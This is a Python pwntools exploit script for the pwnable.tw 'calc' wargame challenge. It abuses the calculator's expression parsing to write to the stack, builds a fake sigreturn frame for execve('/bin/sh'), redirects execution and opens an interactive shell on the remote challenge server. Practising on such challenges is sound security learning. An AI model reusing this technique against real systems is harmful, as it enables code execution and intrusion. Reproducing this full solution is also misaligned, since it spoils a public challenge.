from pwn import *

def wait(listen,send):
    p.recvuntil(listen)
    p.sendline(send)
    return p.recvline()

def lanuch_gdb():
    context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
    print ('pid:'+str(proc.pidof(p)[0]))
    gdb.attach(proc.pidof(p)[0], execute='handle SIGALRM ignore\nb *0x8049378\nc')

#initialize buffer as zero and set ebx as the pointer to '/bin/sh'
def init():
    for i in range(446,420,-1):
        p.sendline('+'+str(i)+'+1')
    for i in range(421,447,1):
        if i==433:
            p.sendline('+433-' + str(raw_stack_addr) + '+1783-1+1')
        else:
            p.sendline('+'+str(i)+'-2+1')

context.kernel='i386'
p = remote('chall.pwnable.tw' ,10100)
elf = ELF('/home/etenal/pwnable.tw/calc/calc')
raw_stack_addr = int(wait('tor ===\n','-5'))
stack_addr = 0xffffffff + raw_stack_addr + 1
raw_stack_addr = abs(raw_stack_addr)
print (hex(stack_addr))
init()
#lanuch_gdb()

#make a fake sigreturn frame
p.sendline('+446-'+str(0x68732f)+'+'+str(0x68732f))
p.sendline('+445-'+str(0x6e69622f)+'+'+str(0x6e69622f))
p.sendline('+442-'+str(0x2b)+'+'+str(0x2b))
p.sendline('+439-'+str(0x23)+'+'+str(0x23))
p.sendline('+438-'+str(0x8049a21)+'+'+str(0x8049a21))
p.sendline('+435-'+str(0xb)+'+'+str(0xb))
p.sendline('+423-'+str(0x8049a21)+'+'+str(0x8049a21))
p.sendline('+422-'+str(0x77)+'+'+str(0x77))
p.sendline('+421-'+str(0x805c34b)+'+'+str(0x805c34b))

#change eip
p.sendline('-8-'+str(0x8049432-0x100+0xc)+'+'+str(0x8049432))
p.interactive()